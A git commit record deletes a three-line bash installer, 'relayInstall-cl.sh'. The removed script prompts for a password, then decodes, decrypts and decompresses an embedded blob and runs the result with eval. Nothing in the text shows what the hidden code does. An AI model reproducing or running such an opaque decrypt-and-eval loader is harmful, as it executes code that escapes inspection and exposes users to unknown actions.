6dfbe76769893e2fa7b9f1e5c699baf5e5dba55c
cp-sc-source <62562732+cp-sc-source@users.noreply.github.com>
2021-07-02 15:05:24 +0100

    Delete relayInstall-cl.sh
    not needed

--- relayInstall-cl.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-read -p "Please provide a password: " PASSWORD
-eval "$(echo "H4sIADa13WAAAwMAAAAAAAAAAAA=" | base64 -d | openssl enc -d -pbkdf2 -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
